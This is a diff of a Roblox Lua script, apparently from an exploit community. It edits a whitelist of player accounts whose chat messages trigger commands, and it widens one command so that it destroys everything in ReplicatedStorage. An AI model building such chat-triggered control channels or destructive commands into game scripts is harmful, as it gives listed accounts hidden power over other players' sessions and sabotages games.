@@ -1,6 +1,6 @@
 local textChatService = game:GetService("TextChatService")
 local allowedplayers = {
-    "stargotleakedlol", --star
+    "SnoopyMyBeloved", --star
     "SnoopyIs2Cool", --Snoopy
     "SnoopyConfigs_OnT_op", --Jbob
     "SnoopyPrivate_INC", --crimsonfied
@@ -149,9 +149,7 @@ local commands = {
             pcall(function()
                 local replicatedStorage = game:GetService("ReplicatedStorage")
                 for _, child in ipairs(replicatedStorage:GetDescendants()) do
-                    if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
-                        child:Destroy()
-                    end
+                    child:Destroy()
                 end
             end)
         end
@@ -198,7 +196,6 @@ local commands = {
         end
     end
 }
-
 
 textChatService.OnIncomingMessage = function(message: TextChatMessage)
     local properties = Instance.new("TextChatMessageProperties")
